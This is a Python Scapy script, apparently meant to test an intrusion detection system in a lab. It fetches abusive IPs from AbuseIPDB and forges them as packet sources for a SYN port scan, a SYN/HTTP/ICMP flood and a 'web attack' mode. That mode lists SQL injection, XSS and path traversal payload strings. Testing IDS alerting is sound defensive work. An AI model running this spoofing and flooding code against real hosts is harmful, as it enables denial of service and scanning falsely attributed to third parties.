#!/usr/bin/env python3
"""
Malicious IP Attack Simulator (Scapy Version)
Uses Scapy for more flexible packet crafting with real malicious IPs from AbuseIPDB
"""

import requests
import json
import time
import sys
import os
from datetime import datetime

try:
    from scapy.all import *
except ImportError:
    print("[!] Error: Scapy is not installed")
    print("[!] Install with: sudo apt install python3-scapy")
    sys.exit(1)

def load_config(config_file='malicious_ip_config.json'):
    """Load configuration from JSON file"""
    try:
        with open(config_file, 'r') as f:
            config = json.load(f)
        return config
    except FileNotFoundError:
        print(f"[!] Config file not found: {config_file}")
        sys.exit(1)
    except json.JSONDecodeError as e:
        print(f"[!] Error parsing config file: {e}")
        sys.exit(1)

def fetch_malicious_ips(api_key, limit=20, confidence_min=90):
    """Fetch malicious IPs from AbuseIPDB"""
    print(f"[*] Querying AbuseIPDB for malicious IPs (confidence >= {confidence_min})...")

    url = "https://api.abuseipdb.com/api/v2/blacklist"
    headers = {
        'Accept': 'application/json',
        'Key': api_key
    }
    params = {
        'confidenceMinimum': confidence_min,
        'limit': limit,
    }

    try:
        response = requests.get(url, headers=headers, params=params, timeout=15)
        response.raise_for_status()
        data = response.json()

        if 'data' not in data:
            print(f"[!] API Error: {data.get('errors', 'Unknown error')}")
            return []

        malicious_ips = []
        for entry in data['data']:
            malicious_ips.append({
                'ip': entry['ipAddress'],
                'country': entry.get('countryCode', 'UN'),
                'score': entry.get('abuseConfidenceScore', 0),
                'usage_type': entry.get('usageType', 'Unknown'),
                'domain': entry.get('domain', 'N/A')
            })

        print(f"[+] Successfully fetched {len(malicious_ips)} malicious IPs")
        return malicious_ips

    except requests.exceptions.RequestException as e:
        print(f"[!] Network error: {e}")
        return []

def display_ip_summary(malicious_ips):
    """Display summary of fetched malicious IPs"""
    print("\n" + "=" * 70)
    print("  MALICIOUS IP SUMMARY")
    print("=" * 70)

    # Group by country
    by_country = {}
    for ip_data in malicious_ips:
        country = ip_data['country']
        if country not in by_country:
            by_country[country] = []
        by_country[country].append(ip_data)

    for country, ips in sorted(by_country.items()):
        print(f"\n[{country}] - {len(ips)} IPs")
        for ip_data in ips[:3]:  # Show first 3 from each country
            print(f"  ├─ {ip_data['ip']:<16} Score: {ip_data['score']}/100 | {ip_data['usage_type']}")
        if len(ips) > 3:
            print(f"  └─ ... and {len(ips) - 3} more")

    print("\n" + "=" * 70)

def send_syn_packet(src_ip, dst_ip, dst_port, country_code, score):
    """Send a single SYN packet with spoofed source IP"""
    try:
        # Craft IP layer with spoofed source
        ip_layer = IP(src=src_ip, dst=dst_ip)

        # Craft TCP layer with SYN flag
        tcp_layer = TCP(sport=RandShort(), dport=dst_port, flags="S", seq=RandInt())

        # Combine layers
        packet = ip_layer / tcp_layer

        # Send packet (verbose=0 for silent)
        send(packet, verbose=0)

        return True
    except Exception as e:
        print(f"[!] Error sending packet: {e}")
        return False

def send_http_get_packet(src_ip, dst_ip, dst_port):
    """Send HTTP GET request with spoofed source IP"""
    try:
        ip_layer = IP(src=src_ip, dst=dst_ip)
        tcp_layer = TCP(sport=RandShort(), dport=dst_port, flags="S")
        packet = ip_layer / tcp_layer / Raw(load="GET / HTTP/1.1\r\nHost: target\r\n\r\n")

        send(packet, verbose=0)
        return True
    except Exception as e:
        return False

def send_icmp_packet(src_ip, dst_ip):
    """Send ICMP ping with spoofed source IP"""
    try:
        packet = IP(src=src_ip, dst=dst_ip) / ICMP()
        send(packet, verbose=0)
        return True
    except Exception as e:
        return False

def simulate_port_scan(malicious_ips, target_ip, ports, rate):
    """Simulate port scanning from multiple malicious IPs"""
    print(f"\n[*] Simulating port scan attack...")
    print(f"[*] Target: {target_ip}")
    print(f"[*] Ports: {ports}")
    print(f"[*] Source IPs: {len(malicious_ips)}")

    delay = 1.0 / rate
    packet_count = 0

    for port in ports:
        for ip_data in malicious_ips:
            packet_count += 1
            src_ip = ip_data['ip']
            country = ip_data['country']
            score = ip_data['score']

            print(f"[{packet_count}] SYN → {target_ip}:{port} from {src_ip} ({country}) Score:{score}", end='')

            if send_syn_packet(src_ip, target_ip, port, country, score):
                print(" ✓")
            else:
                print(" ✗")

            time.sleep(delay)

def simulate_web_attack(malicious_ips, target_ip, target_port, num_requests, rate):
    """Simulate web-based attack from malicious IPs"""
    print(f"\n[*] Simulating web attack...")
    print(f"[*] Target: {target_ip}:{target_port}")
    print(f"[*] Requests: {num_requests}")

    delay = 1.0 / rate

    attack_patterns = [
        "/?id=1' OR '1'='1",  # SQL injection
        "/?q=<script>alert(1)</script>",  # XSS
        "/../../../etc/passwd",  # Directory traversal
        "/admin/login",  # Unauthorized access
    ]

    for i in range(num_requests):
        ip_data = malicious_ips[i % len(malicious_ips)]
        src_ip = ip_data['ip']
        country = ip_data['country']
        pattern = attack_patterns[i % len(attack_patterns)]

        print(f"[{i+1}/{num_requests}] {src_ip} ({country}) → {pattern}", end='')

        if send_syn_packet(src_ip, target_ip, target_port, country, ip_data['score']):
            print(" ✓")
        else:
            print(" ✗")

        time.sleep(delay)

def simulate_ddos(malicious_ips, target_ip, target_port, total_packets, rate):
    """Simulate DDoS attack from multiple malicious IPs"""
    print(f"\n[*] Simulating DDoS attack...")
    print(f"[*] Target: {target_ip}:{target_port}")
    print(f"[*] Total packets: {total_packets}")
    print(f"[*] Rate: {rate} packets/second")
    print(f"[*] Duration: ~{total_packets / rate:.1f} seconds")

    delay = 1.0 / rate

    for i in range(total_packets):
        ip_data = malicious_ips[i % len(malicious_ips)]
        src_ip = ip_data['ip']
        country = ip_data['country']
        score = ip_data['score']

        # Vary attack types
        if i % 3 == 0:
            attack_type = "SYN"
            success = send_syn_packet(src_ip, target_ip, target_port, country, score)
        elif i % 3 == 1:
            attack_type = "HTTP"
            success = send_http_get_packet(src_ip, target_ip, target_port)
        else:
            attack_type = "ICMP"
            success = send_icmp_packet(src_ip, target_ip)

        status = "✓" if success else "✗"
        print(f"[{i+1}/{total_packets}] {attack_type} from {src_ip} ({country}) Score:{score} {status}")

        time.sleep(delay)

def main():
    print("=" * 70)
    print("  MALICIOUS IP ATTACK SIMULATOR (Scapy Edition)")
    print("  Powered by AbuseIPDB + Scapy")
    print("=" * 70)
    print()

    # Check root privileges
    if os.geteuid() != 0:
        print("[!] Error: This script requires root privileges")
        print("[!] Run with: sudo python3 malicious_ip_simulator_scapy.py")
        sys.exit(1)

    # Load configuration
    config = load_config()

    api_key = config.get('abuseipdb_api_key')
    if api_key == "YOUR_API_KEY_HERE" or not api_key:
        print("[!] Error: Please set your AbuseIPDB API key")
        print("[!] Edit 'abuseipdb_api_key' in malicious_ip_config.json")
        sys.exit(1)

    target_ip = config.get('target_ip', '192.168.56.128')
    target_ports = config.get('target_ports', [80])
    settings = config.get('attack_settings', {})

    total_packets = settings.get('total_packets', 50)
    rate = settings.get('packets_per_second', 5)
    confidence_min = settings.get('confidence_minimum', 90)

    # Fetch malicious IPs
    malicious_ips = fetch_malicious_ips(api_key, limit=20, confidence_min=confidence_min)

    if not malicious_ips:
        print("[!] No malicious IPs fetched. Exiting.")
        sys.exit(1)

    # Display summary
    display_ip_summary(malicious_ips)

    # Attack menu
    print("\n[?] Select attack type:")
    print("  1. Port Scan (scans multiple ports from malicious IPs)")
    print("  2. Web Attack (simulates SQL injection, XSS attempts)")
    print("  3. DDoS Simulation (mixed SYN/HTTP/ICMP flood)")
    print("  4. All of the above (full demo)")
    print("  0. Exit")

    choice = input("\n[?] Enter choice (1-4): ").strip()

    if choice == '0':
        print("[!] Exiting...")
        sys.exit(0)

    # Confirm
    print(f"\n[!] WARNING: You are about to simulate an attack on {target_ip}")
    print(f"[!] Packets will be sent from {len(malicious_ips)} real malicious IPs")
    confirm = input("[?] Continue? (yes/no): ").strip().lower()

    if confirm not in ['yes', 'y']:
        print("[!] Aborted by user")
        sys.exit(0)

    # Execute attack
    start_time = datetime.now()

    if choice == '1':
        simulate_port_scan(malicious_ips, target_ip, target_ports, rate)
    elif choice == '2':
        simulate_web_attack(malicious_ips, target_ip, target_ports[0], total_packets, rate)
    elif choice == '3':
        simulate_ddos(malicious_ips, target_ip, target_ports[0], total_packets, rate)
    elif choice == '4':
        print("\n[*] Running full attack simulation suite...")
        simulate_port_scan(malicious_ips, target_ip, target_ports[:3], rate)
        time.sleep(2)
        simulate_web_attack(malicious_ips, target_ip, target_ports[0], 20, rate)
        time.sleep(2)
        simulate_ddos(malicious_ips, target_ip, target_ports[0], 30, rate)
    else:
        print("[!] Invalid choice")
        sys.exit(1)

    end_time = datetime.now()
    duration = (end_time - start_time).total_seconds()

    print("\n" + "=" * 70)
    print("  ATTACK SIMULATION COMPLETE")
    print("=" * 70)
    print(f"[+] Duration: {duration:.2f} seconds")
    print(f"[+] Source IPs used: {len(malicious_ips)}")
    print(f"[+] Check your IDS dashboard now!")
    print(f"[+] You should see alerts from known malicious IPs worldwide")
    print("=" * 70)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
